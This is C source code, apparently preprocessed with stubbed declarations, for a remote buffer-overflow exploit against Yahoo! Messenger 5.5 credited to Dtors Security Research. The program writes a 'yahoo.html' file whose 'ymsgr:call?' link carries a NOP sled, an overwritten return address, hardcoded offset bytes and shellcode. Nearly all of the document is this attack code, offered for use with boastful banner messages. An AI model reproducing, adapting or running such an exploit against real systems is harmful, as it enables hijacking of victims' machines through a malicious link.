
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int exit (int) ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fprintf (int *,char*,...) ;
 int memcpy (unsigned char*,char*,int) ;
 int memset (unsigned char*,int,int) ;
 char* ret ;
 int * stderr ;
 int * stdout ;
 int strlen (char*) ;
 char* win32_msgbox ;

int main(int argc,char *argv[])
{
 FILE *evil;
 char *shellcode = win32_msgbox;
 unsigned char buffer[5000];
 int offset=320;

                fprintf(stdout, "\n\tYahPoo.c By bob.\n");
         fprintf(stdout, "Remote Exploit for Yahoo! Messenger 5.5\n");
         fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n\n");

                fprintf(stdout,"Makin' da EbUL HTML File... ");
  if ((evil =fopen("yahoo.html","w"))==((void*)0)){
   fprintf(stderr,"Failed\n");
   exit(1);
   } else {
   fprintf(stderr,"Opened!\n");
   }



 memset(buffer,0x00,offset+32+strlen(shellcode));
  memset(buffer,0x90,offset);


 memcpy(buffer+offset,ret,4);
 memcpy(buffer+offset+4,shellcode,strlen(shellcode));

        buffer[264] = 0xD4;
        buffer[265] = 0x96;
        buffer[266] = 0x7A;
        buffer[267] = 0x01;

        buffer[272] = 0xF5;
 buffer[273] = 0x01;
 buffer[274] = 0x01;
 buffer[275] = 0x78;

 fprintf(evil,"<html>");
 fprintf(evil,"<title>Bought to you by dtors.net!</title>\n");
 fprintf(evil,"<B>Dtors Security Research (DSR)</B>\n");
 fprintf(evil,"<p>Yahoo Messenger 5.5 exploit....</p>\n");
 fprintf(evil,"<pre>");
 fprintf(evil,"<a href=%cymsgr:call?%s%c>!EbUL Link!</a></body></pre></html>\x00\x00\x00",0x22,buffer,0x22);
 fclose(evil);

 fprintf(stdout,"\nDa ebUL HTML file is >>yahoo.html<<\nEnjoy!\nwww.dtors.net\n\n");

  }
